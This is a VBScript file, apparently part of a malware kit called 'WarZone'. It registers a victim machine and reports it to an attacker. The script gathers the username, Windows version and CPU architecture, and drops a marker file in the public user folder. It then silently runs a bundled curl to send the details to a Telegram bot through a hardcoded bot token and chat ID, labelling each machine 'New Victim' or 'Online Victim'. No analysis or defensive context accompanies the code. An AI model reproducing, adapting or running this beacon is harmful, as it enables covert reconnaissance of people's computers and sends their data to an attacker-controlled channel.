set oShell = Wscript.CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set SystemSet = GetObject("winmgmts:").InstancesOf ("Win32_OperatingSystem") 

dir = objFSO.GetParentFolderName(WScript.ScriptFullName)

token = "5319490970:AAHysb-VELFVh6_sFu6WbYSL5qdfUiB1cQI"
chat_id = "5176730926"
text = "%F0%9F%98%88 "

If objFSO.FileExists("C:\Users\Public\WarZone.txt") Then
	text = text + "Online Victim : \n"
Else
	text = text + "New Victim : \n"
	objFSO.CreateTextFile("C:\Users\Public\WarZone.txt")
End If

For Each i in SystemSet
    OS_Name = i.Caption
    Exit For
Next

text = text + " %E2%9D%96 Username : " + CreateObject("WScript.Network").UserName + "\n"
text = text + " %E2%9D%96 OS Version : " + OS_Name + "\n"

If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth = 64 Then
	text = text + " %E2%9D%96 Bits : " + "64\n"
Else
	text = text + " %E2%9D%96 Bits : " + "32\n"
End IF

text = Replace(text, " ", "%20")
text = Replace(text, "\n", "%0A")
text = Replace(text, ":", "%3A")

oShell.Run "C:\Users\Public\WarZone\curl.exe -k https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text + "--WarZone--",0,True
